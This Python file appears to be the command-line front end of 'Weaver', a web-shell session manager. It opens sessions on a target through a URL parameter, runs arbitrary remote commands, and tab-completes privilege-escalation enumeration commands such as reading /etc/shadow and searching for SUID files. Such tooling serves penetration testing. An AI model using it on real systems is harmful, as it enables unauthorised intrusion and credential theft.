"""
CLI entry point and command router.

Maps raw text input to manager operations and delegates all rendering to UI.
Uses prompt_toolkit for readline-style editing, history, tab-completion,
and auto-suggestion in every prompt (both main and per-session).
"""
from __future__ import annotations

import sys
from typing import List, Optional

from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory

from .exceptions import InvalidArgumentError, SessionNotFoundError
from .manager import SessionManager
from .session import WebShellSession
from .ui import ui

# ── Tab completers ────────────────────────────────────────────────────────────

_MAIN_COMPLETER = WordCompleter(
    [
        "add", "list", "fg", "info", "rename",
        "header", "cookie", "kill", "help", "exit", "quit",
    ],
    ignore_case=True,
    sentence=True,
)

_SESSION_COMPLETER = WordCompleter(
    [
        # Built-in session commands
        "bg", "exit", "info", "refresh", "history",
        # Common enumeration commands (quality-of-life completions)
        "id", "whoami", "uname -a", "hostname",
        "ls", "ls -la", "ls -lah",
        "pwd", "env", "printenv",
        "ps aux", "ps -ef",
        "netstat -tlnp", "ss -tlnp",
        "ip a", "ifconfig",
        "cat /etc/passwd", "cat /etc/shadow", "cat /etc/hostname",
        "find / -perm -4000 -type f 2>/dev/null",
        "find / -writable -type f 2>/dev/null",
        "sudo -l",
        "crontab -l", "cat /etc/crontab",
    ],
    ignore_case=True,
    sentence=True,
)


# ── CLI class ─────────────────────────────────────────────────────────────────

class CLI:
    """
    Top-level orchestrator.

    Reads commands from the terminal, validates arguments, delegates to
    SessionManager for logic, and delegates output to UI. Never reaches into
    network or session internals directly (Dependency Inversion Principle).
    """

    def __init__(self) -> None:
        self._manager = SessionManager()
        self._main_prompt = PromptSession(
            history=InMemoryHistory(),
            auto_suggest=AutoSuggestFromHistory(),
            completer=_MAIN_COMPLETER,
        )

    # ── Main loop ─────────────────────────────────────────────────────────────

    def run(self) -> None:
        ui.print_banner()
        ui.print_info(
            "Type [bold cyan]help[/bold cyan] for commands, "
            "[cyan]add <url> <param>[/cyan] to open a shell."
        )
        ui.console.print()

        _dispatch = {
            "add":    self._cmd_add,
            "list":   self._cmd_list,
            "fg":     self._cmd_fg,
            "info":   self._cmd_info,
            "rename": self._cmd_rename,
            "header": self._cmd_header,
            "cookie": self._cmd_cookie,
            "kill":   self._cmd_kill,
            "help":   lambda _: ui.print_help(),
            "exit":   self._cmd_exit,
            "quit":   self._cmd_exit,
        }

        while True:
            try:
                raw = self._main_prompt.prompt(
                    HTML("<b><ansicyan>Weaver</ansicyan></b> <ansiwhite>›</ansiwhite> ")
                ).strip()
            except (KeyboardInterrupt, EOFError):
                ui.print_info("Goodbye.")
                break

            if not raw:
                continue

            parts = raw.split()
            verb, args = parts[0].lower(), parts[1:]

            handler = _dispatch.get(verb)
            if handler:
                handler(args)
            else:
                ui.print_error(
                    f"Unknown command [bold]'{verb}'[/bold]. "
                    "Type [cyan]help[/cyan] for usage."
                )

    # ── Command handlers ──────────────────────────────────────────────────────

    def _cmd_add(self, args: List[str]) -> None:
        if len(args) < 2:
            ui.print_error("Usage: [bold]add[/bold] <url> <param> [GET|POST]")
            return

        url    = args[0]
        param  = args[1]
        method = args[2].upper() if len(args) > 2 else "GET"

        if method not in ("GET", "POST"):
            ui.print_error("Method must be [bold]GET[/bold] or [bold]POST[/bold].")
            return

        ui.print_info(f"Connecting to [cyan]{url}[/cyan] …")
        try:
            with ui.console.status("[bold cyan]Probing target …[/bold cyan]", spinner="dots"):
                session = self._manager.add_session(url, param, method)
        except Exception as exc:
            ui.print_error(str(exc))
            return

        s = session.snapshot()
        os_icon = {"Linux": "🐧", "Windows": "🪟", "macOS": "🍎"}.get(s.os_type, "❓")
        ui.print_success(
            f"Session [bold yellow]{s.session_id}[/bold yellow] opened  "
            f"[green]{s.username}[/green]@[cyan]{s.hostname}[/cyan]  "
            f"{os_icon} [dim]{s.os_type} / {s.shell_type}[/dim]"
        )
        ui.print_info(
            f"Use [cyan]fg {s.session_id}[/cyan] to interact "
            f"or [cyan]list[/cyan] to view all sessions."
        )

    def _cmd_list(self, _args: List[str]) -> None:
        ui.print_sessions_table(self._manager.list_snapshots())

    def _cmd_fg(self, args: List[str]) -> None:
        sid = self._parse_id(args, "fg <session_id>")
        if sid is None:
            return
        try:
            session = self._manager.get_session(sid)
        except SessionNotFoundError as exc:
            ui.print_error(str(exc))
            return
        self._interactive_loop(session)

    def _cmd_info(self, args: List[str]) -> None:
        sid = self._parse_id(args, "info <session_id>")
        if sid is None:
            return
        try:
            ui.print_session_detail(self._manager.get_session(sid).snapshot())
        except SessionNotFoundError as exc:
            ui.print_error(str(exc))

    def _cmd_rename(self, args: List[str]) -> None:
        if len(args) < 2:
            ui.print_error("Usage: [bold]rename[/bold] <session_id> <label>")
            return
        sid = self._parse_id([args[0]], "rename <id> <label>")
        if sid is None:
            return
        label = " ".join(args[1:])
        try:
            self._manager.rename_session(sid, label)
            ui.print_success(f"Session [yellow]{sid}[/yellow] labelled as '[cyan]{label}[/cyan]'.")
        except SessionNotFoundError as exc:
            ui.print_error(str(exc))

    def _cmd_header(self, args: List[str]) -> None:
        if len(args) < 3:
            ui.print_error("Usage: [bold]header[/bold] <session_id> <key> <value>")
            return
        sid = self._parse_id([args[0]], "header <id> <key> <value>")
        if sid is None:
            return
        try:
            self._manager.get_session(sid).set_header(args[1], args[2])
            ui.print_success(
                f"Header [cyan]{args[1]}[/cyan]: [white]{args[2]}[/white] "
                f"set for session [yellow]{sid}[/yellow]."
            )
        except SessionNotFoundError as exc:
            ui.print_error(str(exc))

    def _cmd_cookie(self, args: List[str]) -> None:
        if len(args) < 3:
            ui.print_error("Usage: [bold]cookie[/bold] <session_id> <key> <value>")
            return
        sid = self._parse_id([args[0]], "cookie <id> <key> <value>")
        if sid is None:
            return
        try:
            self._manager.get_session(sid).set_cookie(args[1], args[2])
            ui.print_success(
                f"Cookie [cyan]{args[1]}[/cyan]=[white]{args[2]}[/white] "
                f"set for session [yellow]{sid}[/yellow]."
            )
        except SessionNotFoundError as exc:
            ui.print_error(str(exc))

    def _cmd_kill(self, args: List[str]) -> None:
        sid = self._parse_id(args, "kill <session_id>")
        if sid is None:
            return
        try:
            self._manager.kill_session(sid)
            ui.print_success(f"Session [yellow]{sid}[/yellow] terminated.")
        except SessionNotFoundError as exc:
            ui.print_error(str(exc))

    def _cmd_exit(self, _args: List[str]) -> None:
        ui.print_success("Goodbye.")
        sys.exit(0)

    # ── Interactive session TTY loop ───────────────────────────────────────────

    def _interactive_loop(self, session: WebShellSession) -> None:
        snap = session.snapshot()
        os_icon = {"Linux": "🐧", "Windows": "🪟", "macOS": "🍎"}.get(snap.os_type, "❓")
        ui.print_success(
            f"Foregrounded session [bold yellow]{snap.session_id}[/bold yellow]  "
            f"{os_icon}  [green]{snap.username}[/green]@[cyan]{snap.hostname}[/cyan]  "
            f"[dim]{snap.shell_type}[/dim]"
        )
        ui.print_info(
            "[cyan]bg[/cyan] → background   "
            "[cyan]exit[/cyan] → kill session   "
            "[cyan]refresh[/cyan] → re-probe context   "
            "[cyan]history[/cyan] → command log"
        )
        ui.console.print()

        session_prompt = PromptSession(
            history=InMemoryHistory(),
            auto_suggest=AutoSuggestFromHistory(),
            completer=_SESSION_COMPLETER,
        )

        while True:
            prompt_html = HTML(
                f"<ansigreen><b>{session.username}</b></ansigreen>"
                f"<ansiwhite>@</ansiwhite>"
                f"<ansicyan>{session.hostname}</ansicyan>"
                f"<ansiwhite>:</ansiwhite>"
                f"<ansiblue>{session.cwd}</ansiblue>"
                f"<ansiwhite> $ </ansiwhite>"
            )

            try:
                cmd = session_prompt.prompt(prompt_html).strip()
            except (KeyboardInterrupt, EOFError):
                ui.console.print()
                ui.print_info("Session backgrounded.")
                break

            if not cmd:
                continue

            lower = cmd.lower()

            if lower == "bg":
                ui.print_info("Session backgrounded.")
                break

            if lower == "exit":
                try:
                    self._manager.kill_session(session.id)
                except SessionNotFoundError:
                    pass
                ui.print_info("Session terminated.")
                break

            if lower == "info":
                ui.print_session_detail(session.snapshot())
                continue

            if lower == "refresh":
                with ui.console.status("[cyan]Re-probing target …[/cyan]", spinner="dots"):
                    session.refresh_context()
                ui.print_success("Context refreshed.")
                continue

            if lower == "history":
                if not session.history:
                    ui.print_info("No commands in history yet.")
                else:
                    for i, h in enumerate(session.history, 1):
                        ui.console.print(f"  [dim]{i:>4}[/dim]  {h}")
                continue

            # Remote execution
            with ui.console.status("[dim]executing …[/dim]", spinner="line"):
                result = session.run_command(cmd)
            ui.print_output(result)

    # ── Helpers ───────────────────────────────────────────────────────────────

    @staticmethod
    def _parse_id(args: List[str], usage_hint: str = "") -> Optional[int]:
        if not args:
            if usage_hint:
                ui.print_error(f"Usage: [bold]{usage_hint}[/bold]")
            return None
        try:
            return int(args[0])
        except ValueError:
            ui.print_error("Session ID must be an integer.")
            return None


# ── EP ────────────────────────────────────────────────────────────────────────

def main() -> None:
    cli = CLI()
    cli.run()


if __name__ == "__main__":
    main()

